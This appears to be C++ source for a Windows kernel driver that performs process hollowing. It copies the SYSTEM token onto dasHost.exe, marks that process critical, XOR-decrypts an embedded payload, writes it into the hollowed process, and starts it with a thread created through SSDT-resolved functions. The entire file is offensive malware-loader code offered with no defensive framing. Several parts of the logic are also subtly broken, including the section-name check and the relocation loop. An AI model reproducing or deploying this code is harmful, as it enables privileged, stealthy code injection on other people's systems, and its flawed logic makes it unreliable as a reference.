#include "ssdt.hpp"
#include "ntdef.hpp"
#include "payload.hpp"

NTSTATUS ProtectProcess(HANDLE hProcess)
{
	NTSTATUS status = STATUS_SUCCESS;

	CLIENT_ID clientId;
	HANDLE handle, hToken;

	TOKEN_PRIVILEGES tkp = { 0 };
	OBJECT_ATTRIBUTES objAttr;
	ULONG BreakOnTermination = 1;

	clientId.UniqueThread = NULL;
	clientId.UniqueProcess = hProcess;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

	status = ZwOpenProcess(&handle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
	if (!NT_SUCCESS(status))
	{
		return status;
	}

	status = ZwOpenProcessTokenEx(handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, OBJ_KERNEL_HANDLE, &hToken);
	if (!NT_SUCCESS(status))
	{
		ZwClose(hToken);
		return status;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tkp.Privileges[0].Luid = RtlConvertLongToLuid(SE_DEBUG_PRIVILEGE);

	status = ZwAdjustPrivilegesToken(hToken, FALSE, &tkp, 0, NULL, NULL);
	if (!NT_SUCCESS(status))
	{
		ZwClose(hToken);
		return status;
	}

	status = ZwSetInformationProcess(handle, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
	if (!NT_SUCCESS(status))
	{
		ZwClose(hToken);
		return status;
	}

	tkp.Privileges[0].Luid = RtlConvertLongToLuid(SE_TCB_PRIVILEGE);
	status = ZwSetInformationProcess(handle, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
	if (!NT_SUCCESS(status))
	{
		ZwClose(hToken);
		return status;
	}

	ZwClose(hToken);
	return status;
}

NTSTATUS ElevatePrivileges(HANDLE hProcess)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pTargetProcess, pSrcProcess;
	ULONG srcPid = 4;

	status = PsLookupProcessByProcessId(hProcess, &pTargetProcess);
	if (!NT_SUCCESS(status))
		return status;

	status = PsLookupProcessByProcessId(ULongToHandle(srcPid), &pSrcProcess);
	if (!NT_SUCCESS(status))
		return status;

	* (UINT64*)((UINT64)pTargetProcess + (UINT64)TOKEN) = *(UINT64*)(UINT64(pSrcProcess) + (UINT64)TOKEN);

	return status;
}

HANDLE OpenProcess()
{
	NTSTATUS status = STATUS_SUCCESS;
	PSYSTEM_PROCESS_INFO originalInfo = NULL;
	PSYSTEM_PROCESS_INFO info = NULL;
	OBJECT_ATTRIBUTES objAttr;
	CLIENT_ID clientId;
	ULONG infoSize; 
	HANDLE proc = { 0 };

	status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		if (originalInfo) {
			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
			originalInfo = NULL;
		}

		originalInfo = (PSYSTEM_PROCESS_INFO)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);

		if (!originalInfo)
			return NULL;

		status = ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
	}

	info = originalInfo;

	while (info->NextEntryOffset) {
		if (info->ImageName.Buffer && info->ImageName.Length > 0) {
			if (_wcsicmp(info->ImageName.Buffer, L"dasHost.exe") == 0) {
				proc = info->UniqueProcessId;
				break;
			}
		}
		info = (PSYSTEM_PROCESS_INFO)((PUCHAR)info + info->NextEntryOffset);
	}

	return proc;
}

VOID encrypt(unsigned char* data, size_t length, const char* key) {
	size_t keyLength = strlen(key);
	for (size_t i = 0; i < length; i++)
		data[i] ^= key[i % keyLength];
}

VOID decrypt(unsigned char* data, size_t length, const char* key) {
	encrypt(data, length, key);
}

NTSTATUS ProcessHollowing()
{
    NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS targetProcess, currentProcess = PsGetCurrentProcess();
	HANDLE hProcess = { 0 }, hTarget = { 0 };
	OBJECT_ATTRIBUTES objAttr = { 0 };
	CLIENT_ID clientId = { 0 };

	hTarget = OpenProcess();
	if (hTarget == NULL)
		return STATUS_ABANDONED;

	status = ElevatePrivileges(hTarget);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[-] Failed to elevate process privileges: 0x%x", status);
	}

	status = ProtectProcess(hTarget);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[-] Failed to protect process: 0x%x", status);
	}

	decrypt(payload, sizeof(payload), "1234567890");

	DbgPrint("[+] BYTE 1: %d\n", sizeof(payload));

	clientId.UniqueProcess = hTarget;
	clientId.UniqueThread = NULL;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

	status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[-] Could not open process: 0x%x\n", status);
		return status;
	}

	status = PsLookupProcessByProcessId(hTarget, &targetProcess);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[-] Failed to open process (EPROCESS): 0x%x\n", status);
		return status;
	}

	PPEB peb = PsGetProcessPeb(targetProcess);
	DbgPrint("[+] PEB: 0x%x\n", peb);

	ULONG_PTR imageBaseOffset = (ULONG_PTR)peb + 16;

	PVOID address = GetSSDTFunctionAddress("NtReadVirtualMemory");
	NtReadVirtualMemoryPtr ntReadVirtualMemory = reinterpret_cast<NtReadVirtualMemoryPtr>(address);

	PVOID dImageBase = { 0 };
	SIZE_T rSize;
	status = ntReadVirtualMemory(hProcess, (PVOID)imageBaseOffset, &dImageBase, 8, &rSize);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[-] Failed to read memory: 0x%x\n", status);
		return status;
	}
	DbgPrint("[+] Image base: 0x%x\n", dImageBase);

	status = ZwUnmapViewOfSection(hProcess, dImageBase);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[-] Failed to unmap view of section: 0x%x\n", status);
		return status;
	}
	DbgPrint("[+] Unmaped view of section!\n");
	 
	PIMAGE_DOS_HEADER sourceDosHeader = (PIMAGE_DOS_HEADER)payload;
	PFULL_IMAGE_NT_HEADERS sourceNtHeaders = (PFULL_IMAGE_NT_HEADERS)((ULONG_PTR)payload + sourceDosHeader->e_lfanew);
	SIZE_T sourceImageSize = sourceNtHeaders->OptionalHeader.SizeOfImage;

	status = ZwAllocateVirtualMemory(hProcess, &dImageBase, NULL, &sourceImageSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[-] Failed to allocate memory: 0x%x\n", status);
		return status;
	}
	DbgPrint("[+] Allocated memory!\n");

	ULONG_PTR delta = (ULONG_PTR)dImageBase - sourceNtHeaders->OptionalHeader.ImageBase;
	sourceNtHeaders->OptionalHeader.ImageBase = (ULONG_PTR)dImageBase;

	address = GetSSDTFunctionAddress("NtWriteVirtualMemory");
	NtWriteVirtualMemoryPtr ntWriteVirtualMemory = reinterpret_cast<NtWriteVirtualMemoryPtr>(address);

	status = ntWriteVirtualMemory(hProcess, dImageBase, payload, sourceNtHeaders->OptionalHeader.SizeOfHeaders, &rSize);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[-] Failed to write memory!\n");
		return status;
	}
	DbgPrint("[+] Payload has been written to memory!\n");

	PIMAGE_SECTION_HEADER sourceImgSection = (PIMAGE_SECTION_HEADER)((ULONG_PTR)payload + sourceDosHeader->e_lfanew + sizeof(_FULL_IMAGE_NT_HEADERS));
	PIMAGE_SECTION_HEADER prevSourceImgSection = sourceImgSection;

	for (int i = 0; i < sourceNtHeaders->FileHeader.NumberOfSections; i++)
	{
		PVOID destSectionLocation = (PVOID)((ULONG_PTR)dImageBase + sourceImgSection->VirtualAddress);
		PVOID sourceSectionLocation = (PVOID)((ULONG_PTR)payload + sourceImgSection->PointerToRawData);

		status = ntWriteVirtualMemory(hProcess, destSectionLocation, sourceSectionLocation, sourceImgSection->SizeOfRawData, &rSize);
		if (!NT_SUCCESS(status))
			return status;

		sourceImgSection++;
	}

	IMAGE_DATA_DIRECTORY relocTable = sourceNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	sourceImgSection = prevSourceImgSection;
	for (int i = 0; i < sourceNtHeaders->FileHeader.NumberOfSections; i++)
	{
		BYTE* relocSectionName = (BYTE*)".reloc";
		if (RtlCopyMemory(sourceImgSection->Name, relocSectionName, 5) != 0)
		{
			sourceImgSection++;
			continue;
		}

		ULONG_PTR sourceRelocationTableRaw = sourceImgSection->PointerToRawData;
		ULONG_PTR relocOffset = 0;

		while (relocOffset < relocTable.Size)
		{
			PBASE_RELOCATION_BLOCK relocBlock = (PBASE_RELOCATION_BLOCK)((ULONG_PTR)payload + sourceRelocationTableRaw + relocOffset);
			relocOffset += sizeof(BASE_RELOCATION_BLOCK);

			ULONG_PTR relocEntryCount = (relocBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK) - sizeof(BASE_RELOCATION_ENTRY));
			PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)((ULONG_PTR)payload + sourceRelocationTableRaw + relocOffset);

			for (ULONG_PTR y = 0; y < relocEntryCount; y++)
			{
				relocOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocEntries[0].Type == 0)
					continue;

				ULONG_PTR patchAddress = relocBlock->PageAddress + relocEntries[y].Offset;
				ULONG_PTR patchedBuffer = 0;

				status = ntReadVirtualMemory(hProcess, (PVOID)((ULONG_PTR)dImageBase + patchAddress), &patchedBuffer, sizeof(ULONG_PTR), &rSize);
				if (!NT_SUCCESS(status))
					return status;

				patchedBuffer += delta;

				status = ntWriteVirtualMemory(hProcess, (PVOID)((ULONG_PTR)dImageBase + patchAddress), &patchedBuffer, sizeof(ULONG_PTR), &rSize);
				if (!NT_SUCCESS(status))
					return status;
			}
		}
	}

	ULONG_PTR patchedEntryPoint = (ULONG_PTR)dImageBase + sourceNtHeaders->OptionalHeader.AddressOfEntryPoint;

	address = GetSSDTFunctionAddress("NtCreateThreadEx");
	NtCreateThreadExPtr ntCreateThreadEx = reinterpret_cast<NtCreateThreadExPtr>(address);

	HANDLE hThread;
	status = ntCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)patchedEntryPoint, dImageBase, 0, NULL, NULL, NULL, NULL);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[-] Failed to create thread: 0x%x\n", status);
		return status;
	}
	DbgPrint("[+] Thread has been patched!\n");
	DbgPrint("[!] Success!\n");

	return status;
}